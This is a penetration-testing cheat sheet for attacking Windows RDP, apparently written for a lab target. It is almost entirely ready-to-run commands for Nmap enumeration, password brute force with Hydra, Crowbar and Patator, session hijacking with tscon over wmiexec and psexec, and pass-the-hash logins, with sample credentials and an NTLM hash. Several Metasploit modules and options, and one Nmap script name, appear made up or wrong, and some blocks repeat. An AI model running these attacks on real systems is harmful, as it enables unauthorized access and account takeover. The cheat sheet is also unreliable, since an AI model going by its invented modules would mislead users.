# RDP Enumeration and Exploitation Technique

---

# 1. Nmap

```bash
# Basic RDP scan
nmap -p3389 --script rdp* 10.129.203.12

# Detailed RDP info
nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info,rdp-security,nmap-rdp,rdp-vuln-ms12-006 10.129.203.12

# NLA check + creds test
nmap -p3389 --script rdp-ntlm-info --script-args rdp-ntlm-info.timeout=30s 10.129.203.12

rdp-enum-encryption: RDP encryption levels
rdp-ntlm-info: NLA enabled? NTLMv1/2 support
rdp-security: CredSSP/NLA detection
nmap-rdp: Protocol version
```

# 2. Authentication

```bash
# xfreerdp (Linux → Windows)
xfreerdp /u:Administrator /p:Pass123 /v:10.129.203.12

# rdesktop
rdesktop -u Administrator -p Pass123 10.129.203.12

# Windows RDP
mstsc /v:10.129.203.12 /u:Administrator /p:Pass123

# No NLA bypass
xfreerdp /u:user /p:pass /v:target -cert-ignore -sec-nla
```

# 3. Brute Force

```bash
# Hydra
hydra -L users.txt -P rockyou.txt rdp://10.129.203.12

# Crowbar (RDP-specific)
crowbar -b rdp -s 10.129.203.12/32 -u administrator -C rockyou.txt

# Patator
patator rdp_login host=10.129.203.12 user=FILE0 0=users.txt password=FILE1 1=pass.txt
```

# 4. Session Hijacking

```bash
# Existing sessions (wmiexec/evil-winrm)
wmic /node:TARGET /user:admin /password:pass path win32_logonsession where LoggedOnUser like "%DOMAIN%" get LoggedOnUser,LogonId /format:list

# qwinsta (psloggedon)
qwinsta /server:TARGET
# SESSIONNAME       USERNAME                 ID  STATE
#                  console                   1  Active
#                  rdp-tcp#0                 2  Active


# Current user-da
qwinsta
tscon 2 /dest:console  # ID 2 session → console

# Remote (wmiexec)
wmiexec.py admin:pass@TARGET "qwinsta && tscon 2 /dest:console"


psexec.py -u admin -p pass TARGET cmd /c "qwinsta && tscon 2 /dest:console"
```

```bash
# Metasploit
msfconsole
use auxiliary/admin/rdp/session_event
set RHOSTS 10.129.203.12
set RPORT 3389
set USERNAME htldbuser  
set PASSWORD MSSQLAccess01!
set SESSION 2  # qwinsta-dan al
run

use auxiliary/gather/rdp_session_cloner
set RHOSTS 10.129.203.12
set LHOST YOUR_IP
set USERNAME admin
set PASSWORD pass
run

# 1. RDP enum
use auxiliary/scanner/rdp/rdp_sessions  
set RHOSTS 10.129.203.12
run

# 2. Session event hijack
use auxiliary/admin/rdp/session_event
set RHOSTS 10.129.203.12
set USERNAME htldbuser
set PASSWORD MSSQLAccess01!
exploit

msfconsole

# Session enum
use auxiliary/scanner/rdp/rdp_sessions
set RHOSTS 10.129.203.12
set USERNAME htldbuser
set PASSWORD MSSQLAccess01!
run

# Hijack (session ID-dən sonra)
use auxiliary/admin/rdp/session_event
set RHOSTS 10.129.203.12  
set USERNAME htldbuser
set PASSWORD MSSQLAccess01!
set RDP_SESSION_ID 2  # Active session
exploit
```

# 5. RDP Pass The Hash

```bash
# NTLM hash format: admin::domain:LMHASH:NTHASH::: 
xfreerdp /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7587C /v:10.129.203.12

# Full PTH
xfreerdp /u:Administrator /d:WIN-02 /h:8846F7EAEE8FB117AD06BDD830B7587C /v:10.129.203.12 /cert-ignore

# impacket-extras
python3 rdp_pth.py WIN-02/Administrator@10.129.203.12 -hashes :8846F7EAEE8FB117AD06BDD830B7587C

# Ya psexec üçün
psexec.py WIN-02/Administrator@10.129.203.12 -hashes :8846F7EAEE8FB117AD06BDD830B7587C

msfconsole
use auxiliary/scanner/rdp/rdp_login
set RHOSTS 10.129.203.12
set USERNAME Administrator
set RPORT 3389
set PTH_HASH 8846F7EAEE8FB117AD06BDD830B7587C
run
```
